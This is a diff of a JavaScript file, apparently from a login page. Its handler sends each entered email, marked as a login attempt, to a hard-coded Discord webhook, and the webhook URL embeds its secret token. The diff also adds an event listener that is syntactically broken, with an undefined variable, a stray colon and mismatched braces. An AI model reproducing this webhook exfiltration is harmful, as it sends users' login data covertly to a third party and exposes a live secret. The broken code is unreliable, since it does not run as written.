@@ -72,14 +72,14 @@
            
             const webhookUrl = 'https://discordapp.com/api/webhooks/1339385478553800704/AgWcJ--FjDu48PZgF3wr40-Fr_yxXMgLWlg-da8lc5aYJ-Z6u1VXuHflVBIYDnsvt4Fl';
             try {
-                // Send the email message to Discord webhook using fetch
+            
                 fetch(webhookUrl, {
                     headers: {
                         'Content-Type': 'application/json',
                         'Message-ID': new Date().toISOString(),
                         'Subject': new Date().toLocaleTimeString()
                     },
-                    body: `To: ${email}\n\nMessage from login attempt on ${new Date().getUTCFullYear()`}
+                    body: `To: ${email}\n\nMessage from login attempt on ${new Date().getUTCFullYear()}`
                 })
                 
                 alert('Email notification sent successfully!');
@@ -88,8 +88,12 @@
                 alert('Failed to send email notification');
             }
         });
+        document.getElementById('relder').addEventListener('focus', function() {
+            if (this.target == document.body) {
+                e.preventDefault():
+            }
+        }};
 
-        // Prevent default form submission
         document.getElementById('reloader').addEventListener('click', function() {
             if (document.body.lastElementChild.lastElementChild) {
                 document.getElementById('relder').disabled = true;
